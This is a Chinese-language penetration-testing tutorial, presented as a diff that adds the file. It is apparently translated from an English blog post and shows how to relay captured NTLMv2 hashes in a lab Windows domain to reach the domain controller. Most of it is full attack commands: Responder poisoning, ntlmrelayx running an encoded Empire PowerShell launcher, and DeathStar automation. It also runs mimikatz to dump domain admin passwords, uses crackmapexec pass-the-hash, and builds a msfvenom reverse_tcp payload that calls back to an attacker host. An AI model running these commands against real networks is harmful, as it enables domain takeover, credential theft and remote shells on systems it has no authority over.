@@ -1,0 +1,59 @@
+本文将会用到的工具：
+操作系统
+主机：Ubuntu 16.04，Kali Linux（最新版）
+目标1：Windows Server 2008 R2（虚拟服务器）
+目标2：Windows Server 2008 R2（域控制器）
+当进行域渗透的时候，我们往往需要通过某种方式来获取NTLMv2的哈希。但我们不难发现，NTLMv2的哈希并不像普通的NTLM哈希可以被直接传递，因此如果你没有一个超级强大的字典，你将很难获取到正确的访问凭据。那么，真的就没有其它办法了吗？其实，我们还可以通过一种中继的方式来中继获取的用户名和哈希。此外，如果捕获的凭据具有访问Windows server共享权限的话，则还可能导致远程代码执行。
+在正式开始之前，我需要说明一些情况。
+现在让我们开始吧！
+首先我在一个终端上启动Empire的RESTful API。
+sudo python empire --rest --username empireadmin --password Password123
+然后我在另一个终端启动Deathstar。
+sudo ./DeathStar.py --listener-ip 192.168.232.133 -t 100
+Listener IP将是任何Empire正在侦听的IP。-t 100表示我给它100个线程运行，所以速度更快。
+接下来，我要从Empire生成powershell脚本。键入到Empire的listener模块
+Listeners
+通过以下命令创建payload
+launcher powershell Deathstar
+复制powershell脚本，一会儿你需要粘贴它。
+接下来，我设置了ntlmrelayx.py（NTLMRelayx.py设置可以参考这里）
+sudo ntlmrelayx.py -t 192.168.232.100 -c 'powershell -noP -sta -w 1 -enc [powershell code]’
+ntlmrelayx.py也支持-tf开关的文件（例如target.txt），所以你可以同时放入多个目标。注意，powershell脚本必须在引号中，否则将不会运行。
+接下来，编辑Responder库中的Responder.conf文件并关闭SMB和HTTP
+最后启动Responder
+sudo python Responder.py -I ens33 -r -d –v
+一切设置无误后，最后你的屏幕看起来应该像这样
+接下来，使用我的Windows机器，模拟域管理员输入一个共享，生成一个LLMNR请求。
+毒化回应然后通过Responder发送
+NTLMv2哈希凭据被中继
+Empire agent打开
+Deathstar开始自动化渗透过程
+在该演示中，Deathstar花了大约5分钟的时间来找到域控制器，及活跃用户，然后在域控上生成了另一个Empire agent。
+一个Empire agent正运行在DC上
+最后一步是获取到一个shell。
+有很多方法可以帮我们做到这一点
+上传一个.exe格式的meterpreter payload，并通过shell命令执行 使用mimikatz获取服务器上的凭据，并使用crackmapexec传递散列打开meterpreter session 使用Empire的Invoke-Shellcode模块 更多
+使用Mimikatz & Crackmapexec开启Meterpreter Shell
+首先是与agent交互。始终使用SYSTEM权限的agent。虽然“god”是域管理员，SYSTEM仍是一个很高的用户权限。
+interact [agent name]
+然后启动mimikatz
+mimikatz
+大概一分钟后，你会看到大量打印信息。我们直接忽略这些内容按回车，并键入以下命令
+creds
+此时，你将会获取到一个排列整齐的表格数据
+如你所看到的，我们获取到了域管理员的哈希和明文密码。这里，我们可以使用crackmapexec打开一个反向shell。
+首先，我们设置下multi/handler
+然后运行crackmapexec。 虽然我已经有了明文密码，但这里我为大家演示依然可以通过PTH攻击。
+crackmapexec 192.168.232.100 -u god -H 7314885dc066c5fd98e6ae96832fa905 -M metinject -o LHOST=192.168.232.136 LPORT=4443
+通过Empire上传一个Meterpreter Payload
+首先，我们创建一个Meterpreter payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.232.136 LPORT=4443 -f exe > shell.exe
+复制.exe到Empire目录
+与Empire agent交互
+interact [Agent name]
+上传可执行的.exe
+得到shell
+除了以上介绍的两种方法之外，其实还有许多其他的方法。虽然以上提供的方法不是最隐蔽和最值得推荐的，但却是最简单和实用的。
+更多关于Deathstar & Crackmapexec的实用指南，请通过以下链接了解：
+https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+*参考来源：hausec，FB小编 secist 编译，转载请注明来自FreeBuf.COM
